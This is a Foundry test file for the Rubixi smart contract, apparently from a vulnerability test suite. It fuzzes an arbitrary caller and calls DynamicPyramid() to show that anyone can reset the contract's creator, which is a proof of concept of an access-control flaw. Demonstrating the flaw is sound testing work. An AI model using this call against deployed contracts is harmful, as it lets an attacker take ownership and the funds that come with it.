
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // Exclude the initial creator set by the constructor
        vm.assume(caller != address(this));

        // --- 2. State Configuration ---
        // No special state needed; we just need an arbitrary caller.

        // --- 3. Execution & Assertion ---
        vm.prank(caller);

        // Trigger vulnerability: any caller can reset `creator`
        _contractUnderTest.DynamicPyramid();
    }
}
